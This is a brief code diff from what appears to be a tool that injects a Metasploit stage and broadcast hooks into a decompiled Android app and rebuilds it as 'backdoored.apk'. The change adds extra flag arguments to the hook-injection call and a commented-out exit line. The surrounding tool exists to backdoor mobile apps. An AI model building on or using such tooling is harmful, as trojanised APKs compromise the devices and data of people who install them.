@@ -168,7 +168,7 @@ def place_hooks():
     # Broadcast hook
     if args['broadcast_hook']:
         # TODO make paths dynamic
-        broadcast_hook.inject_broadcast_hook("original/_decompiled/AndroidManifest.xml", "original/_decompiled/smali/com/metasploit/stage/","com/metasploit/stage/" ,True, True, True)
+        broadcast_hook.inject_broadcast_hook("original/_decompiled/AndroidManifest.xml", "original/_decompiled/smali/com/metasploit/stage/","com/metasploit/stage/" ,True, True, True, True, True, True)
         pass
 
 def main():
@@ -206,6 +206,7 @@ def main():
 
     place_hooks()
 
+    #exit(1)
     injected_apk = "backdoored.apk"
 
     print "[*] Rebuilding"
